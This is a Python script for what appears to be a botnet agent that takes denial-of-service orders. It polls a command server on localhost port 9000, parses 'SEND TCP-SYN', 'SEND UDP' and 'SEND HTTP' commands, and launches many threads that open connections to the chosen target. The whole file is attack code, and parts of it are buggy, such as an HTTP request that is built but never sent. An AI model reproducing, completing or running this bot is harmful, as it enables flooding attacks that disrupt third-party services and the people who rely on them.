import socket
import time
import random
import threading

def http_get_attacks(url_string, port):
    headers = [
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
        "Accept-Language: en-us,en;q=0.5"
    ]
    message = "Get /? {} HTTP/1.1\r\n".format(str(random.randint(0, 2000))).encode("utf-8")

    try: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((url_string, port))
        for header in headers: 
            s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
    except socket.error as se:
        print("Error: "+str(se))
        time.sleep(0.5)
     #   return self.newSocket()

class Poison (threading.Thread):
    def __init__(self, threadID, url, port, type_name):
        threading.Thread.__init__(self)
        self.url = url#socket.gethostbyname(url)
        self.port = port
        self.threadID = threadID
        self.type_name = type_name
    def run(self):
        if(self.type_name == "http_attack"):
            http_get_attacks(self.url, self.port)
            return
        if(self.type_name == "tcp_attack"):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
        if(self.type_name == "udp_attack"):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
        sock.settimeout(4)
        print(f'Connecting to {url}:{port}')
        sock.connect((self.url, self.port))
        time.sleep(1)
        sock.close()
        
       

def attack(url, port, n, type_name):
    threads = []
    print("Creating theads...")
    for i in range(n):
        threads.append(Poison(i, url, port, type_name))

    print("Starting threads...")
    for thread in threads:
        thread.start()

    print("Waiting for threads...")
    for thread in threads:
        thread.join()

while True:
    master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master.connect(("localhost", 9000))

    res = master.recv(64)

    command = res.decode("utf-8")

    try:
        if command.startswith("SEND TCP-SYN"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n, "tcp_attack")
        if command.startswith("SEND UDP"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n, "udp_attack")
        if command.startswith("SEND HTTP"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n, "http_attack")
    except Exception as e:
        print("Error decoding command")
        print(e)
    master.close()
    time.sleep(3)

    # add ip address to bot master
